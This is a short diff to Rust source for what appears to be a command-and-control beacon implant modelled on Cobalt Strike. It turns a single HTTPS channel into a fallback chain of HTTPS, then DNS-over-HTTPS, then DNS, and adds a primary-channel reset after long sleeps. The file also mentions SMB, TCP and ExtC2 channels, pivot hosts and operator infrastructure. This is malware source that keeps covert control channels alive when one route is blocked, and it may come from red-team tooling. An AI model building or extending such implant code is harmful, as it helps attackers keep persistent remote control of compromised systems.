@@ -247,16 +247,25 @@ pub unsafe fn dispatch_send_recv(
 // Fallback chain
 // ══════════════════════════════════════════════════════════════════════════════
 
-/// Build-time fallback chain. Currently just [Https] — will be populated from
-/// Config.fallback_bitmap once build.rs bakes it. For now, a single-element
-/// chain means "no fallback, retry primary on failure".
+/// Build-time fallback chain.
 ///
-/// TODO(spec-1 follow-up): read from baked config bitmap.
-const DEFAULT_FALLBACK_CHAIN: &[Channel] = &[Channel::Https];
+/// The three HTTP-based channels form a natural degradation ladder: if the
+/// primary HTTPS endpoint is down, fall back to DoH (same TCP/TLS plumbing,
+/// different URI), then to plain DNS-over-HTTP. Beyond Dns, the remaining
+/// channels (SMB/Tcp/ExtC2) require operator-configured infrastructure
+/// (pipe names, pivot hosts, API tokens) and cannot be auto-selected — so
+/// exhausting the chain returns `None` and the beacon long-sleeps then
+/// retries its primary, matching CS 4.10 fail-hold behaviour.
+const DEFAULT_FALLBACK_CHAIN: &[Channel] = &[Channel::Https, Channel::DohDns, Channel::Dns];
+
+/// The primary channel — the first element of the fallback chain. When the
+/// chain is exhausted the beacon resets to this so the next cycle retries
+/// the primary rather than spinning on the last failed channel.
+pub const PRIMARY_CHANNEL: Channel = Channel::Https;
 
 /// Returns the next channel to try after `current` fails.
 /// Walks the fallback chain; if exhausted, returns `None` (caller should
-/// long-sleep then retry the primary).
+/// long-sleep then reset to [`PRIMARY_CHANNEL`] and retry).
 pub fn next_fallback(current: Channel) -> Option<Channel> {
     let chain: &[Channel] = DEFAULT_FALLBACK_CHAIN;
     let idx = chain.iter().position(|&c| c == current)?;
